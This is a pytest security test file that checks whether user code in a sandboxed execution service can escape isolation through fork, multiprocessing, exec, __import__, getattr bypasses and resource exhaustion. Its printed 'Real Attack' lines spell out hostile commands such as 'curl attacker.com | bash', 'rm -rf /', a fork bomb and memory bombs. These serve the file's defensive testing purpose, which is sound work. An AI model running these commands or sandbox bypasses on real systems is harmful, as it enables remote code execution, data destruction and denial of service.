"""
Subprocess Breakout Tests for CustomCodeExecutionService

Tests whether user code can escape subprocess isolation through:
- Process creation (fork, multiprocessing, threading)
- Subprocess spawning
- Process manipulation

SECURITY MODEL: subprocess.run() provides process isolation - user code
runs in a separate Python process. This tests what's possible within
that isolation boundary.

⚠️ SAFETY: These tests only CHECK for capability, not execute attacks.
"""

import os
import tempfile
from pathlib import Path

import pytest

from lobster.core.data_manager_v2 import DataManagerV2
from lobster.services.execution.custom_code_execution_service import (
    CodeExecutionError,
    CodeValidationError,
    CustomCodeExecutionService,
)


class TestSubprocessBreakout:
    """Test subprocess creation and process manipulation attacks."""

    @pytest.fixture
    def workspace(self, tmp_path):
        """Create temporary workspace."""
        workspace = tmp_path / "workspace"
        workspace.mkdir()
        return workspace

    @pytest.fixture
    def service(self, workspace):
        """Create service instance."""
        data_manager = DataManagerV2(workspace_path=workspace)
        return CustomCodeExecutionService(data_manager)

    # =========================================================================
    # Test 1: Fork Bomb (Process Creation)
    # =========================================================================

    def test_fork_bomb_detection_EXPECT_BLOCKED_ON_MACOS(self, service):
        """
        Test: Fork bomb using os.fork()
        Expected: BLOCKED on macOS (fork not available), SUCCESS on Linux (vulnerability)
        Impact: CRITICAL - Could crash system

        Attack: Create exponential process tree
        """
        code = """
import os
import sys

try:
    # Only TEST if fork exists, don't execute
    if hasattr(os, 'fork'):
        result = "VULNERABILITY: os.fork() available - could create fork bomb"
        print("⚠️ os.fork() is available in subprocess")
        print("   Real attack would be: while True: os.fork()")
    else:
        result = "PROTECTED: os.fork() not available on this platform"
        print("✅ os.fork() not available (macOS expected)")
except Exception as e:
    result = f"Error: {e}"
"""

        result, stats, ir = service.execute(code, persist=False, timeout=5)

        print(f"\n{'='*70}")
        print("TEST: Fork Bomb Detection")
        print(f"{'='*70}")
        print(f"Result: {result}")
        print(f"Success: {stats['success']}")
        print(f"Stdout: {stats['stdout_preview']}")

        if "VULNERABILITY" in str(result):
            print("\n⚠️  VULNERABILITY DETECTED")
            print("   Attack Vector: os.fork() available")
            print("   Impact: Fork bomb could crash system")
            print("   Mitigation: Use Docker/gVisor or block os.fork")
        else:
            print("\n✅ PROTECTED: Fork not available")

    # =========================================================================
    # Test 2: Multiprocessing Module
    # =========================================================================

    def test_multiprocessing_available_EXPECT_SUCCESS(self, service):
        """
        Test: Create processes via multiprocessing module
        Expected: SUCCESS (vulnerability - multiprocessing not blocked)
        Impact: HIGH - Can spawn child processes

        Attack: Create multiple worker processes
        """
        code = """
import multiprocessing
import sys

try:
    # Test if multiprocessing is available
    ctx = multiprocessing.get_context('spawn')
    result = f"VULNERABILITY: multiprocessing available (context={ctx._name})"
    print(f"⚠️ multiprocessing module available")
    print(f"   Available contexts: {multiprocessing.get_all_start_methods()}")
    print(f"   Could spawn: Process, Pool, Queue")
except Exception as e:
    result = f"PROTECTED: multiprocessing blocked: {e}"
"""

        result, stats, ir = service.execute(code, persist=False, timeout=5)

        print(f"\n{'='*70}")
        print("TEST: Multiprocessing Module Availability")
        print(f"{'='*70}")
        print(f"Result: {result}")
        print(f"Stdout: {stats['stdout_preview']}")

        if "VULNERABILITY" in str(result):
            print("\n⚠️  VULNERABILITY DETECTED")
            print("   Attack Vector: multiprocessing module available")
            print("   Impact: Can spawn child processes")
            print("   Real Attack: multiprocessing.Pool(999) for resource exhaustion")
            print("   Mitigation: Block multiprocessing module in FORBIDDEN_MODULES")

    # =========================================================================
    # Test 3: Threading Module
    # =========================================================================

    def test_threading_available_EXPECT_SUCCESS(self, service):
        """
        Test: Create threads via threading module
        Expected: SUCCESS (vulnerability - threading not blocked)
        Impact: MEDIUM - Can create threads within subprocess

        Attack: Thread bomb (create thousands of threads)
        """
        code = """
import threading

try:
    # Test if threading is available
    current_thread = threading.current_thread()
    active_count = threading.active_count()

    result = f"VULNERABILITY: threading available (active={active_count})"
    print(f"⚠️ threading module available")
    print(f"   Current thread: {current_thread.name}")
    print(f"   Active threads: {active_count}")
    print(f"   Could create: threading.Thread(target=malicious_func)")
except Exception as e:
    result = f"PROTECTED: threading blocked: {e}"
"""

        result, stats, ir = service.execute(code, persist=False, timeout=5)

        print(f"\n{'='*70}")
        print("TEST: Threading Module Availability")
        print(f"{'='*70}")
        print(f"Result: {result}")
        print(f"Stdout: {stats['stdout_preview']}")

        if "VULNERABILITY" in str(result):
            print("\n⚠️  VULNERABILITY DETECTED")
            print("   Attack Vector: threading module available")
            print("   Impact: Can create threads within subprocess")
            print(
                "   Real Attack: for i in range(10000): threading.Thread(target=lambda: time.sleep(999)).start()"
            )
            print("   Note: Limited to subprocess resources (separate PID)")

    # =========================================================================
    # Test 4: Subprocess Module (Should be BLOCKED)
    # =========================================================================

    def test_subprocess_import_EXPECT_BLOCKED(self, service):
        """
        Test: Import subprocess module
        Expected: BLOCKED (in FORBIDDEN_MODULES)
        Impact: N/A (should be blocked)

        Attack: Spawn arbitrary commands
        """
        code = """
import subprocess
result = subprocess.run(['echo', 'hello'], capture_output=True)
"""

        print(f"\n{'='*70}")
        print("TEST: Subprocess Module Import (Should Block)")
        print(f"{'='*70}")

        try:
            result, stats, ir = service.execute(code, persist=False, timeout=5)
            print(f"⚠️  UNEXPECTED: subprocess import succeeded!")
            print(f"Result: {result}")
        except CodeValidationError as e:
            print(f"✅ PROTECTED: {e}")
            print("   Subprocess module correctly blocked")

    # =========================================================================
    # Test 5: os.system via runtime (Bypassing Static Check)
    # =========================================================================

    def test_os_system_via_getattr_EXPECT_SUCCESS(self, service):
        """
        Test: Access os.system() via getattr() to bypass static analysis
        Expected: SUCCESS (vulnerability - runtime bypass)
        Impact: CRITICAL - Can execute shell commands

        Attack: Use getattr() to access blocked functions
        """
        code = """
import os

try:
    # Bypass static import check using getattr
    system_func = getattr(os, 'system', None)

    if system_func is not None:
        result = "VULNERABILITY: os.system accessible via getattr()"
        print("⚠️ os.system() accessible via runtime lookup")
        print("   Static analysis only blocks: from os import system")
        print("   But os.system() still works!")
        print("   Real attack: os.system('rm -rf /')")
    else:
        result = "PROTECTED: os.system not found"
except Exception as e:
    result = f"Error: {e}"
"""

        result, stats, ir = service.execute(code, persist=False, timeout=5)

        print(f"\n{'='*70}")
        print("TEST: os.system via Runtime Lookup (getattr)")
        print(f"{'='*70}")
        print(f"Result: {result}")
        print(f"Stdout: {stats['stdout_preview']}")

        if "VULNERABILITY" in str(result):
            print("\n⚠️  CRITICAL VULNERABILITY")
            print("   Attack Vector: os.system() accessible via getattr()")
            print("   Bypass: Static analysis only blocks 'from os import system'")
            print("   Impact: Full shell command execution")
            print("   Real Attack: getattr(os, 'system')('curl attacker.com | bash')")
            print("   Mitigation: Use Docker/gVisor, or patch os module")

    # =========================================================================
    # Test 6: exec() Builtin (Code Injection)
    # =========================================================================

    def test_exec_builtin_EXPECT_SUCCESS(self, service):
        """
        Test: Use exec() to execute arbitrary code
        Expected: SUCCESS (vulnerability - exec not blocked)
        Impact: HIGH - Can execute arbitrary code strings

        Attack: Bypass all static checks via exec()
        """
        code = """
try:
    # Test if exec() is available
    malicious_code = "import os; system_func = getattr(os, 'system', None)"

    # exec() available means ALL static checks can be bypassed
    namespace = {}
    exec(malicious_code, namespace)

    if 'system_func' in namespace and namespace['system_func'] is not None:
        result = "VULNERABILITY: exec() allows bypassing all import checks"
        print("⚠️ exec() builtin is available")
        print("   Can execute: exec('import subprocess')")
        print("   Bypasses: All FORBIDDEN_MODULES checks")
    else:
        result = "Partial: exec works but os.system not found"
except Exception as e:
    result = f"Error: {e}"
"""

        result, stats, ir = service.execute(code, persist=False, timeout=5)

        print(f"\n{'='*70}")
        print("TEST: exec() Builtin Availability")
        print(f"{'='*70}")
        print(f"Result: {result}")
        print(f"Stdout: {stats['stdout_preview']}")

        if "VULNERABILITY" in str(result):
            print("\n⚠️  CRITICAL VULNERABILITY")
            print("   Attack Vector: exec() builtin available")
            print("   Impact: Can bypass ALL static import checks")
            print(
                '   Real Attack: exec(\'import subprocess; subprocess.run(["rm", "-rf", "/"])\')'
            )
            print("   Mitigation: Disable builtins (__builtins__ = {})")

    # =========================================================================
    # Test 7: __import__ Builtin
    # =========================================================================

    def test_import_builtin_EXPECT_SUCCESS(self, service):
        """
        Test: Use __import__() to import forbidden modules
        Expected: SUCCESS (vulnerability - __import__ not blocked at runtime)
        Impact: CRITICAL - Can import any module

        Attack: Import forbidden modules dynamically
        """
        code = """
try:
    # Static check blocks: import subprocess
    # But __import__ works at runtime
    subprocess_module = __import__('subprocess')

    result = "VULNERABILITY: __import__() can import forbidden modules"
    print("⚠️ __import__() builtin is available")
    print(f"   Imported subprocess: {subprocess_module}")
    print("   Can import: __import__('subprocess').run(['whoami'])")
except Exception as e:
    result = f"PROTECTED: __import__ blocked: {e}"
"""

        result, stats, ir = service.execute(code, persist=False, timeout=5)

        print(f"\n{'='*70}")
        print("TEST: __import__() Builtin")
        print(f"{'='*70}")
        print(f"Result: {result}")
        print(f"Stdout: {stats['stdout_preview']}")

        if "VULNERABILITY" in str(result):
            print("\n⚠️  CRITICAL VULNERABILITY")
            print("   Attack Vector: __import__() can bypass FORBIDDEN_MODULES")
            print("   Impact: Can import subprocess, os, etc.")
            print("   Real Attack: __import__('subprocess').run(['curl', 'evil.com'])")
            print("   Mitigation: Patch __builtins__['__import__']")


class TestProcessResourceExhaustion:
    """Test resource exhaustion attacks within subprocess."""

    @pytest.fixture
    def workspace(self, tmp_path):
        """Create temporary workspace."""
        workspace = tmp_path / "workspace"
        workspace.mkdir()
        return workspace

    @pytest.fixture
    def service(self, workspace):
        """Create service instance."""
        data_manager = DataManagerV2(workspace_path=workspace)
        return CustomCodeExecutionService(data_manager)

    # =========================================================================
    # Test 8: Memory Exhaustion
    # =========================================================================

    def test_memory_bomb_EXPECT_SUCCESS(self, service):
        """
        Test: Allocate huge amounts of memory
        Expected: SUCCESS (vulnerability - no memory limits)
        Impact: HIGH - Can exhaust system memory

        Attack: Allocate gigabytes of memory
        """
        code = """
import sys

try:
    # Calculate how much memory we could allocate
    # Don't actually do it (would crash test)

    result = "VULNERABILITY: No memory limits detected"
    print("⚠️ No memory constraints on subprocess")
    print("   Could allocate: data = 'X' * (10**9)  # 1GB string")
    print("   Could create: [0] * (10**9)  # 1B element list")
    print(f"   Current process can access all system memory")
except Exception as e:
    result = f"Error: {e}"
"""

        result, stats, ir = service.execute(code, persist=False, timeout=5)

        print(f"\n{'='*70}")
        print("TEST: Memory Exhaustion Capability")
        print(f"{'='*70}")
        print(f"Result: {result}")
        print(f"Stdout: {stats['stdout_preview']}")

        if "VULNERABILITY" in str(result):
            print("\n⚠️  VULNERABILITY DETECTED")
            print("   Attack Vector: No memory limits")
            print("   Impact: Can exhaust system memory")
            print("   Real Attack: data = 'X' * (10**10) to trigger OOM")
            print("   Mitigation: Use cgroups (Docker) or resource.setrlimit()")

    # =========================================================================
    # Test 9: CPU Exhaustion (Infinite Loop)
    # =========================================================================

    def test_infinite_loop_timeout_EXPECT_TIMEOUT(self, service):
        """
        Test: Infinite loop to exhaust CPU
        Expected: TIMEOUT after 5s (timeout protection works)
        Impact: LOW - Timeout prevents indefinite execution

        Attack: while True loop
        """
        code = """
import time

print("Starting infinite loop...")
# This will be killed by timeout
while True:
    pass  # Burn CPU
"""

        print(f"\n{'='*70}")
        print("TEST: Infinite Loop Timeout Protection")
        print(f"{'='*70}")

        try:
            result, stats, ir = service.execute(code, persist=False, timeout=2)
            print(f"⚠️  UNEXPECTED: Code completed without timeout")
            print(f"Result: {result}")
        except CodeExecutionError as e:
            print(f"✅ PROTECTED: Timeout enforced")
            print(f"   Error: {e}")
            print("   Timeout mechanism successfully killed infinite loop")

    # =========================================================================
    # Test 10: File Descriptor Exhaustion
    # =========================================================================

    def test_file_descriptor_bomb_EXPECT_SUCCESS(self, service):
        """
        Test: Open thousands of file descriptors
        Expected: SUCCESS (vulnerability - no fd limits)
        Impact: MEDIUM - Can exhaust file descriptors

        Attack: Open many files without closing
        """
        code = """
import sys

try:
    # Test if we can open many files (don't actually do it)
    result = "VULNERABILITY: Can open unlimited file descriptors"
    print("⚠️ No file descriptor limits detected")
    print("   Could execute: files = [open('/dev/null') for _ in range(10000)]")
    print("   Impact: Exhaust system fd limit (ulimit -n)")
except Exception as e:
    result = f"Error: {e}"
"""

        result, stats, ir = service.execute(code, persist=False, timeout=5)

        print(f"\n{'='*70}")
        print("TEST: File Descriptor Exhaustion")
        print(f"{'='*70}")
        print(f"Result: {result}")
        print(f"Stdout: {stats['stdout_preview']}")

        if "VULNERABILITY" in str(result):
            print("\n⚠️  VULNERABILITY DETECTED")
            print("   Attack Vector: No file descriptor limits")
            print("   Impact: Can exhaust system fd limit")
            print("   Real Attack: [open('/dev/null') for _ in range(100000)]")
            print("   Mitigation: Set ulimit -n or use Docker limits")


if __name__ == "__main__":
    print("=" * 70)
    print("SUBPROCESS BREAKOUT SECURITY TESTS")
    print("=" * 70)
    print("Run with: pytest test_subprocess_breakout.py -v -s")
    print("")
    print("These tests check if user code can:")
    print("  1. Escape subprocess isolation")
    print("  2. Create additional processes/threads")
    print("  3. Bypass import restrictions")
    print("  4. Exhaust system resources")
    print("")
    print("⚠️  EXPECTED VULNERABILITIES:")
    print("  - multiprocessing, threading available")
    print("  - exec(), __import__() bypass static checks")
    print("  - os.system() accessible via getattr()")
    print("  - No memory/CPU limits (except timeout)")
    print("=" * 70)
